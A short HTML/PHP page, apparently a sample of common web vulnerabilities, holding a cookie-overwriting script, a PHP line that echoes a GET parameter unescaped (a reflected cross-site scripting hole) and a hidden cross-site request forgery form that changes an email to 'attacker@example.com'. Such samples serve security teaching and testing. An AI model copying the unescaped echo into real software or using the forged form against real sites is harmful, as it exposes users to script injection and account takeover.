

<html>
<a href="contact.php">Contact Us</a>

<script>
    document.cookie = "user=attacker; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
</script>


<?php
    $user_input = $_GET['user_input'];
    echo "You entered: " . $user_input;
?>

<form action="https://example.com/update-email" method="POST">
    <input type="hidden" name="new-email" value="attacker@example.com">
    <input type="submit" value="Update Email">
</form>

</html>

